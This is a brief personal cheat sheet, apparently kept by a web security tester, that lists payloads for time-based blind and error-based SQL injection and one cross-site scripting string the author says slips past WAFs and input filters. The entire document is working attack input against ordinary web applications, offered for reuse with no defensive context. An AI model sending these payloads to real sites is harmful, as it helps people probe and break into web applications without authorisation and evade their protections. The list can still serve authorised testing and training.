## Just a useless set of payload used by me. Saved here for remembrance.

### SQL Injection
#### Time Based Blind:
 - `(select(if(user()like(user()),sleep(4),sleep(2))))` (Timed Based Blind)
 - `x'.and.(select.count(*).from.shouldNotExistTable)=1.or.'1'='0.` (this is for error based sqli and should return error like : "Table 'x.shouldNotExistTable' doesn't exist")
 - `0' AND (SELECT 4321 FROM (SELECT(SLEEP(2-(IF(20=20,0,5)))))x)-- asd` (Timed Based Blind)

### Cross Site Scripting
 - `[document.domain].find(confirm)` (helped me to bypass WAFs/filters or useful if input is echoed or used as variable in js files)
